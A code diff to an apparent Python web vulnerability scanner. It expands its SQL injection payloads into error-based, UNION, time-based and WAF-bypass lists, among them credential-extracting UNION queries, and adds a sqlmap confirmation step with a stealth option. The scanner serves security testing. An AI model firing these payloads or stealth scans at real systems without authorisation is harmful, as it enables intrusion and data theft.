@@ -231,25 +231,139 @@ def scan_sql_injection(url: str, params: str = "") -> str:
 
     domain = _domain_of(url)
     try:
-        sql_payloads = [
+        # ── COMPREHENSIVE PAYLOAD LIBRARY ──────────────────────────────────────
+        # Error-based payloads
+        error_payloads = [
+            "'",
+            "''",
             "' OR '1'='1",
             "' OR 1=1 --",
-            "' UNION SELECT NULL --",
+            "' OR 1=1 #",
+            "' OR 1=1/*",
             "admin' --",
+            "admin' #",
             "1' AND '1'='1",
-            "' OR 'a'='a"
+            "1' AND '1'='2",
+            "' OR 'a'='a",
+            "') OR ('1'='1",
+            "') OR 1=1 --",
+            "' OR ''='",
+            "' OR ''=''",
+            "1' OR '1'='1' LIMIT 1 --",
+            "1' UNION SELECT NULL --",
+            "1' UNION SELECT NULL,NULL --",
+            "1' UNION SELECT NULL,NULL,NULL --",
+            "' UNION SELECT 1,2,3 --",
+            "' UNION ALL SELECT NULL --",
+            "' UNION ALL SELECT NULL,NULL --",
+            "' AND 1=CONVERT(int,(SELECT @@version)) --",
+            "' AND 1=1 WAITFOR DELAY '0:0:5' --",
+            "1; SELECT 1 --",
+            "' OR SLEEP(5) --",
+            "1' OR '1'='1' LIMIT 1 OFFSET 0 --",
+            "1' OR '1'='1' LIMIT 1 OFFSET 1 --",
+            "admin' OR '1'='1",
+            "' UNION SELECT username,password FROM users --",
+            "' UNION SELECT table_name FROM information_schema.tables --",
+            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
+            "1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64 --",
+            "1' AND LENGTH(database()) > 5 --",
+            "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --",
+            "1' ORDER BY 1 --",
+            "1' ORDER BY 10 --",
+            "1' GROUP BY columnnames HAVING 1=1 --",
         ]
+
+        # Time-based payloads (per DB)
+        time_payloads = [
+            ("' OR SLEEP(5) --", "MySQL"),
+            ("' OR SLEEP(5) #", "MySQL"),
+            ("1 OR SLEEP(5)", "MySQL"),
+            ("' OR BENCHMARK(10000000,SHA1('test')) --", "MySQL"),
+            ("'; WAITFOR DELAY '0:0:5' --", "MSSQL"),
+            ("1; WAITFOR DELAY '0:0:5' --", "MSSQL"),
+            ("' OR pg_sleep(5) --", "PostgreSQL"),
+            ("'; SELECT pg_sleep(5) --", "PostgreSQL"),
+            ("1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --", "PostgreSQL"),
+            ("' OR 1=(SELECT COUNT(*) FROM all_users) AND SLEEP(5) --", "MySQL"),
+            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --", "MySQL"),
+            ("' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --", "MySQL"),
+        ]
+
+        # UNION-based payloads
+        union_payloads = [
+            "' UNION SELECT NULL --",
+            "' UNION SELECT NULL,NULL --",
+            "' UNION SELECT NULL,NULL,NULL --",
+            "' UNION SELECT NULL,NULL,NULL,NULL --",
+            "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
+            "' UNION ALL SELECT NULL --",
+            "' UNION ALL SELECT NULL,NULL --",
+            "' UNION ALL SELECT NULL,NULL,NULL --",
+            "1 UNION SELECT NULL --",
+            "1 UNION SELECT NULL,NULL --",
+            "' UNION SELECT 1,2,3 --",
+            "' UNION SELECT 1,2,3,4 --",
+            "' UNION SELECT 1,2,3,4,5 --",
+            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --",
+            "0 UNION SELECT NULL,NULL,NULL --",
+            "-1 UNION SELECT NULL,NULL,NULL --",
+        ]
+
+        # WAF bypass payloads
+        waf_bypass_payloads = [
+            "'/*!50000OR*/'1'='1",
+            "'/*!OR*/'1'='1",
+            "'%20OR%20'1'='1",
+            "' OR '1'='1'--",
+            "' OR/**/'1'='1",
+            "' OR'1'='1",
+            "' oR '1'='1",
+            "' Or '1'='1",
+            "' or 1=1--",
+            "' OR 1=1 LIMIT 1--",
+            "' /*!OR*/ 1=1--",
+            "' %0aOR%0a1=1--",
+            "' %0d%0aOR%0d%0a1=1--",
+            "' OR''='",
+            "') OR('1'='1",
+            "1' /*!UNION*/ /*!SELECT*/ NULL,NULL,NULL--",
+            "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
+            "1' /*!ORDER*/ /*!BY*/ 1--",
+            "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
+            "admin'/*!--",
+            "' OR'1'='1' LIMIT 1--",
+        ]
+
+        # Combine all payloads
+        all_payloads = list(set(error_payloads + union_payloads + waf_bypass_payloads))
+
+        # Paired Semantic Testing — kirim dua payload yang harusnya hasil beda
+        semantic_pairs = {
+            "numeric": [("1+0", "1+1"), ("1", "2"), ("0", "1")],
+            "string": [("test", "test' OR '1'='1"), ("a", "b"), ("normal", "normal'--")],
+        }
         
-        param_list = [p.strip() for p in params.split(',')] if params else ["id", "q", "search"]
+        param_list = [p.strip() for p in params.split(',')] if params else ["id", "q", "search", "user", "page", "cat", "item"]
         vulnerabilities = []
+        seen_params = set()  # Deduplication — satu finding per parameter
         
-        exec_logger.add_log(tool_name, "PROCESSING", f"Testing {len(param_list)} parameters dengan {len(sql_payloads)} payloads")
+        exec_logger.add_log(tool_name, "PROCESSING", f"Testing {len(param_list)} parameters dengan {len(all_payloads)} payloads + {len(time_payloads)} time-based + semantic pairs")
         
         # Capture baseline using response differ
         baseline = differ.capture_baseline(url)
         
         for param in param_list:
-            for payload in sql_payloads:
+            if param in seen_params:
+                continue  # Skip duplicate params
+            
+            # Determine param type (numeric or string)
+            is_numeric = any(c.isdigit() for c in param) or param.lower() in ("id", "nip", "nim", "user_id", "page", "cat", "item")
+            param_type = "numeric" if is_numeric else "string"
+            pairs = semantic_pairs[param_type]
+
+            # ── Phase 1: Error-based & UNION payloads ─────────────────────────
+            for payload in all_payloads[:40]:  # Limit to top 40
                 try:
                     rate_limiter.wait(domain)
                     test_url = f"{url}?{param}={quote(payload)}"
@@ -260,18 +374,141 @@ def scan_sql_injection(url: str, params: str = "") -> str:
                     
                     # High vulnerability score = likely vulnerable
                     if diff["vulnerability_score"] >= 0.5:
+                        # Confirmation step: kirim safe payload buat verifikasi
+                        _baseline_ref = dict(baseline)
+                        diff["_baseline"] = _baseline_ref
+                        confirmation = differ.confirm_detection(url, param, diff)
+                        
+                        if confirmation["is_false_positive"]:
+                            exec_logger.add_log(
+                                tool_name, "INFO",
+                                f"FP detected on {param}: {confirmation['reason'][:100]}"
+                            )
+                            continue  # Skip false positive
+                        
+                        # Phase 2: Paired Semantic Testing
+                        pair_confirmed = False
+                        for pair_a, pair_b in pairs:
+                            try:
+                                rate_limiter.wait(domain)
+                                url_a = f"{url}?{param}={quote(pair_a)}"
+                                resp_a = requests.get(url_a, timeout=5, verify=False)
+                                
+                                rate_limiter.wait(domain)
+                                url_b = f"{url}?{param}={quote(pair_b)}"
+                                resp_b = requests.get(url_b, timeout=5, verify=False)
+                                
+                                # Check: A == baseline dan B != baseline
+                                a_matches_baseline = (resp_a.text == baseline.get("body", ""))
+                                b_differs_baseline = (resp_b.text != baseline.get("body", ""))
+                                
+                                if a_matches_baseline and b_differs_baseline:
+                                    pair_confirmed = True
+                                    break
+                                # Check: A == B (both error = FP)
+                                elif resp_a.text == resp_b.text:
+                                    pair_confirmed = False
+                                    exec_logger.add_log(tool_name, "INFO", f"Semantic pair failed for {param}: both responses identical")
+                                    break
+                            except:
+                                continue
+
+                        if not pair_confirmed:
+                            exec_logger.add_log(tool_name, "INFO", f"Semantic test inconclusive for {param}")
+                            continue  # Skip — not confirmed
+
+                        # ── SQLMAP CONFIRMATION STEP ────────────────────────────
+                        sqlmap_result = _run_sqlmap_confirmation(url, param, exec_logger)
+                        
+                        if sqlmap_result.get("is_confirmed"):
+                            # sqlmap confirmed - use its findings
+                            vulnerabilities.append({
+                                "parameter": param,
+                                "payload": payload,
+                                "type": f"SQL Injection ({sqlmap_result.get('db_type', 'Unknown')})",
+                                "status_code": response.status_code,
+                                "severity": sqlmap_result.get("severity", "Critical"),
+                                "evidence": sqlmap_result.get("evidence", diff["diff_summary"]),
+                                "score": 1.0,
+                                "confirmed": True,
+                                "semantic_test": "passed",
+                                "sqlmap_confirmed": True,
+                                "db_type": sqlmap_result.get("db_type"),
+                                "injection_details": sqlmap_result.get("injection_details", []),
+                            })
+                        else:
+                            # sqlmap didn't confirm - still keep our finding but with lower confidence
+                            vulnerabilities.append({
+                                "parameter": param,
+                                "payload": payload,
+                                "type": "Error/UNION-based SQLi (Custom detection)",
+                                "status_code": response.status_code,
+                                "severity": "Medium",
+                                "evidence": diff["diff_summary"],
+                                "score": diff["vulnerability_score"],
+                                "confirmed": True,
+                                "semantic_test": "passed",
+                                "sqlmap_confirmed": False,
+                                "note": "Detected by custom scanner, not confirmed by sqlmap",
+                            })
+                        seen_params.add(param)
+                        exec_logger.add_log(tool_name, "WARNING", f"Confirmed SQLi: {param} (score: {diff['vulnerability_score']:.2f})", 
+                                          {"param": param, "payload": payload, "evidence": diff["diff_summary"]})
+                        break  # One finding per param
+                except:
+                    pass
+
+            # ── Phase 2: Time-based payloads ──────────────────────────────────
+            if param not in seen_params:
+                for payload, db_type in time_payloads:
+                    try:
+                        rate_limiter.wait(domain)
+                        test_url = f"{url}?{param}={quote(payload)}"
+                        
+                        # Time consistency check — kirim 2x
+                        delays = []
+                        for _ in range(2):
+                            import time
+                            start = time.time()
+                            response = requests.get(test_url, timeout=12, verify=False)
+                            elapsed = time.time() - start
+                            delays.append(elapsed)
+                        
+                        # Semua delay harus > 4 detik
+                        if all(d >= 4.0 for d in delays):
+                            avg_delay = sum(delays) / len(delays)
+                            vulnerabilities.append({
+                                "parameter": param,
+                                "payload": payload,
+                                "type": f"Time-based Blind SQLi ({db_type})",
+                                "status_code": response.status_code,
+                                "severity": "Critical",
+                                "evidence": f"Consistent delay: {avg_delay:.1f}s avg (2/2 slow)",
+                                "score": 0.9,
+                                "confirmed": True,
+                                "db_type": db_type,
+                            })
+                            seen_params.add(param)
+                            exec_logger.add_log(tool_name, "WARNING", f"Time-based SQLi confirmed: {param}, DB={db_type}, delay={avg_delay:.1f}s")
+                            break
+                    except requests.Timeout:
+                        # Timeout juga bisa indikasi success
                         vulnerabilities.append({
                             "parameter": param,
                             "payload": payload,
-                            "status_code": response.status_code,
-                            "severity": "Critical" if diff["vulnerability_score"] >= 0.7 else "High",
-                            "evidence": diff["diff_summary"],
-                            "score": diff["vulnerability_score"],
+                            "type": f"Time-based Blind SQLi ({db_type}, Timeout)",
+                            "status_code": 0,
+                            "severity": "Critical",
+                            "evidence": "Request timed out — sleep injection likely successful",
+                            "score": 0.85,
+                            "confirmed": True,
+                            "db_type": db_type,
                         })
-                        exec_logger.add_log(tool_name, "WARNING", f"Potential SQLi found: {param} (score: {diff['vulnerability_score']:.2f})", 
-                                          {"param": param, "payload": payload, "evidence": diff["diff_summary"]})
-                except:
-                    pass
+                        seen_params.add(param)
+                        exec_logger.add_log(tool_name, "WARNING", f"Time-based SQLi timeout: {param}, DB={db_type}")
+                        break
+                    except:
+                        pass
         
         if vulnerabilities:
             exec_logger.add_log(tool_name, "SUCCESS", f"Found {len(vulnerabilities)} potential SQLi vulnerabilities")
@@ -291,6 +528,153 @@ def scan_sql_injection(url: str, params: str = "") -> str:
     except Exception as e:
         exec_logger.add_log(tool_name, "ERROR", f"SQLi scan failed: {str(e)}")
         return f"SQLi scan error: {e}"
+
+
+def _run_sqlmap_confirmation(url: str, param: str, exec_logger) -> dict:
+    """
+    Run sqlmap sebagai confirmation step.
+    Return dict dengan is_confirmed, details, severity.
+    """
+    import subprocess
+    import json
+    import os
+    import tempfile
+
+    tool_name = "SQLi Confirmation (sqlmap)"
+    exec_logger.add_log(tool_name, "PROCESSING", f"Running sqlmap on {url} param={param}")
+
+    try:
+        # Create temp output file
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
+            output_file = f.name
+
+        # Run sqlmap with batch mode (non-interactive)
+        cmd = [
+            "sqlmap",
+            "-u", f"{url}?{param}=1",
+            "--batch",
+            "--threads=4",
+            "--output-dir=/tmp/sqlmap_output",
+            "--flush-session",
+            "--forms",
+            "--crawl=0",
+            "--level=3",
+            "--risk=2",
+        ]
+
+        # Apply stealth mode if enabled
+        if os.environ.get("STEALTH_MODE", "0") == "1":
+            cmd.extend([
+                "--random-agent",
+                "--delay=1",
+                "--threads=1",
+                "--timeout=30",
+            ])
+
+        result = subprocess.run(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            timeout=120,  # 2 minute timeout
+        )
+
+        # Parse sqlmap output
+        output = result.stdout + result.stderr
+
+        # Check for vulnerability indicators
+        vulnerable_indicators = [
+            "is vulnerable",
+            "injectable",
+            "Parameter:",
+            "Type:",
+            "Title:",
+            "Payload:",
+            "back-end DBMS:",
+        ]
+
+        is_vulnerable = any(indicator.lower() in output.lower() for indicator in vulnerable_indicators)
+
+        # Extract DB type if found
+        db_type = "Unknown"
+        db_indicators = ["MySQL", "PostgreSQL", "Microsoft SQL Server", "Oracle", "SQLite", "MariaDB"]
+        for db in db_indicators:
+            if db.lower() in output.lower():
+                db_type = db
+                break
+
+        # Extract injection details
+        injection_details = []
+        lines = output.split('\n')
+        for i, line in enumerate(lines):
+            if "Type:" in line or "Title:" in line or "Payload:" in line:
+                injection_details.append(line.strip())
+
+        # Determine severity
+        severity = "High"
+        if is_vulnerable:
+            if "stacked queries" in output.lower():
+                severity = "Critical"
+            elif "UNION" in output:
+                severity = "Critical"
+            elif "time-based" in output.lower():
+                severity = "Critical"
+            elif "boolean-based" in output.lower():
+                severity = "High"
+            elif "error-based" in output.lower():
+                severity = "High"
+
+        # Cleanup
+        try:
+            os.unlink(output_file)
+        except:
+            pass
+
+        if is_vulnerable:
+            exec_logger.add_log(tool_name, "WARNING",
+                f"sqlmap CONFIRMED: {param} is vulnerable ({db_type})")
+            return {
+                "is_confirmed": True,
+                "severity": severity,
+                "db_type": db_type,
+                "injection_details": injection_details[:10],
+                "evidence": output[:500],
+                "tool": "sqlmap",
+            }
+        else:
+            exec_logger.add_log(tool_name, "INFO",
+                f"sqlmap: {param} not confirmed as vulnerable")
+            return {
+                "is_confirmed": False,
+                "severity": "Low",
+                "tool": "sqlmap",
+                "note": "sqlmap could not confirm vulnerability",
+            }
+
+    except subprocess.TimeoutExpired:
+        exec_logger.add_log(tool_name, "WARNING", "sqlmap timed out after 120s")
+        return {
+            "is_confirmed": False,
+            "severity": "Low",
+            "tool": "sqlmap",
+            "note": "sqlmap execution timed out",
+        }
+    except FileNotFoundError:
+        exec_logger.add_log(tool_name, "WARNING", "sqlmap not found - skipping external confirmation")
+        return {
+            "is_confirmed": False,
+            "severity": "Low",
+            "tool": "sqlmap",
+            "note": "sqlmap not installed",
+        }
+    except Exception as e:
+        exec_logger.add_log(tool_name, "WARNING", f"sqlmap error: {str(e)[:100]}")
+        return {
+            "is_confirmed": False,
+            "severity": "Low",
+            "tool": "sqlmap",
+            "note": f"sqlmap error: {str(e)[:100]}",
+        }
 
 
 # ==========================================
